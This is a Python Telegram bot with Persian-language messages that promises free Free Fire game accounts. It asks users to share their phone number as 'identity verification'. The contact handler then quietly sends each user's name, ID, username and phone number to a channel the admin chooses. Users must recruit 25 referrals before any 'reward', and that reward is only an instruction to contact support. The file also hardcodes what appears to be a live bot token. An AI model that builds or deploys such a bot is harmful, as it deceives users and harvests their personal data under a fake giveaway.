import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)

# تنظیمات لوگ برای بررسی خطاها
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ---------------- CONFIGS ----------------
TOKEN = "8986373312:AAGW03MADCNnFcM2-RJYlhAwP2ynAiyiY2M"
ADMIN_ID = 6749949992

# دیتابیس ساده در حافظه
db = {
    "target_channel": None,  # آیدی یا یوزرنیم چنل مقصد
    "users": {}  # user_id: {"referrals": count, "invited_by": id, "phone": str}
}

# حالت مکالمه برای پنل مدیریت
WAITING_FOR_CHANNEL = 1

# ----------------- HELPER FUNCTIONS -----------------
def get_user_data(user_id: int):
    if user_id not in db["users"]:
        db["users"][user_id] = {
            "referrals": 0,
            "invited_by": None,
            "phone": None
        }
    return db["users"][user_id]

def main_keyboard():
    keyboard = [
        ["👤 حساب کاربری", "🔗 لینک رفرال"],
        ["🎁 دریافت اکانت"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ----------------- HANDLERS -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    # بررسی لینک رفرال
    if context.args and not user_data["invited_by"]:
        try:
            referrer_id = int(context.args[0])
            if referrer_id != user.id and referrer_id in db["users"]:
                user_data["invited_by"] = referrer_id
                db["users"][referrer_id]["referrals"] += 1
                
                try:
                    await context.bot.send_message(
                        chat_id=referrer_id,
                        text=f"🎉 **یک کاربر جدید با لینک شما وارد ربات شد!**\n📊 **تعداد زیرمجموعه‌های شما:** `{db['users'][referrer_id]['referrals']}`",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
        except ValueError:
            pass

    # درخواست تایید هویت در صورت عدم ثبت شماره
    if not user_data["phone"]:
        contact_keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("📱 اشتراک شماره تماس (تایید هویت)", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await update.message.reply_text(
            f"سلام {user.first_name} عزیز! 👋\n\n"
            "🔥 **به ربات دریافت اکانت رایگان فری فایر خوش آمدید!**\n\n"
            "⚠️ **تایید هویت:** برای جلوگیری از ورود اکانت‌های فیک و دریافت جایزه، لطفا با کلیک روی دکمه زیر شماره تماس خود را به اشتراک بگذارید تا حسابتان فعال شود.",
            parse_mode="Markdown",
            reply_markup=contact_keyboard
        )
        return

    # پیام خوش‌آمدگویی پس از تایید
    await update.message.reply_text(
        f"سلام {user.first_name} عزیز! 🎯\n\n"
        "به ربات دریافت اکانت رایگان و تضمینی فری فایر خوش آمدید.\n"
        "از دکمه‌های زیر برای مدیریت حساب و دریافت اکانت استفاده کنید: 👇",
        reply_markup=main_keyboard()
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact

    if contact.user_id != user.id:
        await update.message.reply_text("❌ لطفا فقط شماره متعلق به اکانت خودتان را ارسال کنید.")
        return

    user_data = get_user_data(user.id)
    user_data["phone"] = contact.phone_number

    # ارسال اطلاعات به چنل مقصد در صورت تنظیم بودن
    target_channel = db["target_channel"]
    if target_channel:
        try:
            log_text = (
                "📥 **ثبت هویت کاربر جدید**\n\n"
                f"👤 **نام:** {user.full_name}\n"
                f"🆔 **آیدی عددی:** `{user.id}`\n"
                f"🔗 **یوزرنیم:** @{user.username if user.username else 'ندارد'}\n"
                f"📞 **شماره تماس:** `{contact.phone_number}`"
            )
            await context.bot.send_message(chat_id=target_channel, text=log_text, parse_mode="Markdown")
            await context.bot.forward_message(
                chat_id=target_channel,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.message_id
            )
        except Exception as e:
            logging.error(f"خطا در ارسال به چنل: {e}")

    await update.message.reply_text(
        "✅ **حساب شما با موفقیت تایید شد!**\n\n"
        "هم‌اکنون می‌توانید از تمام امکانات ربات استفاده کنید. 🚀",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

async def account_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = get_user_data(user.id)

    text = (
        "📊 **اطلاعات حساب کاربری شما**\n\n"
        f"🆔 **آیدی عددی:** `{user.id}`\n"
        f"👤 **یوزرنیم:** @{user.username if user.username else 'ثبت نشده'}\n"
        f"📱 **وضعیت شماره:** {'✅ تایید شده' if user_data['phone'] else '❌ تایید نشده'}\n"
        f"👥 **تعداد زیرمجموعه‌ها:** `{user_data['referrals']}` نفر\n"
        f"⭐️ **امتیاز کل:** `{user_data['referrals'] * 10}`"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bot_username = (await context.bot.get_me()).username
    link = f"https://t.me/{bot_username}?start={user.id}"

    text = (
        "🔗 **لینک دعوت اختصاصی شما**\n\n"
        "لینک زیر را برای دوستان خود ارسال کنید. با هر دعوت موفق، یک قدم به دریافت اکانت نزدیک‌تر می‌شوید:\n\n"
        f"`{link}`\n\n"
        "📌 *برای کپی، روی لینک بالا کلیک کنید.*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def claim_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = get_user_data(user.id)
    needed = 25
    current = user_data["referrals"]

    if current >= needed:
        await update.message.reply_text(
            "🎉 **تبریک! شما حد نصاب دعوت را تکمیل کردید.**\n\n"
            "جهت دریافت اطلاعات اکانت فری فایر، به پشتیبانی مراجعه کنید یا منتظر پیام مدیر باشید.",
            parse_mode="Markdown"
        )
    else:
        remained = needed - current
        await update.message.reply_text(
            "🔒 **بخش دریافت اکانت قفل است!**\n\n"
            f"شما برای دریافت اکانت باید حداقل **{needed} نفر** را دعوت کنید.\n\n"
            f"📈 **وضعیت فعلی:** `{current}` از `{needed}` نفر\n"
            f"⚡️ **تعداد دعوت باقی‌مانده:** `{remained}` نفر\n\n"
            "از بخش «🔗 لینک رفرال» لینک خود را دریافت کرده و برای دوستانتان بفرستید.",
            parse_mode="Markdown"
        )

# ----------------- ADMIN PANEL -----------------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    current_ch = db["target_channel"] or "تنظیم نشده"
    text = (
        "⚙️ **پنل مدیریت ربات**\n\n"
        f"📢 **چنل ثبت گزارشات فعلی:** `{current_ch}`\n\n"
        "لطفا آیدی یا یوزرنیم چنل مقصد را بفرستید (مثلا `@my_channel` یا `-100123456789`):\n"
        "⚠️ *نکته مهم: حتما قبل از ارسال، ربات را در چنل مقصد ادمین کنید!*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    return WAITING_FOR_CHANNEL

async def save_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END

    channel_input = update.message.text.strip()
    db["target_channel"] = channel_input

    await update.message.reply_text(
        f"✅ چنل مقصد با موفقیت روی `{channel_input}` تنظیم شد.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("عملیات لغو شد.")
    return ConversationHandler.END

# ----------------- MAIN FUNCTION -----------------
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    admin_conv = ConversationHandler(
        entry_points=[CommandHandler("panel", admin_panel)],
        states={
            WAITING_FOR_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_channel)]
        },
        fallbacks=[CommandHandler("cancel", cancel_panel)]
    )

    app.add_handler(admin_conv)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.Regex("^👤 حساب کاربری$"), account_info))
    app.add_handler(MessageHandler(filters.Regex("^🔗 لینک رفرال$"), referral_link))
    app.add_handler(MessageHandler(filters.Regex("^🎁 دریافت اکانت$"), claim_account))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()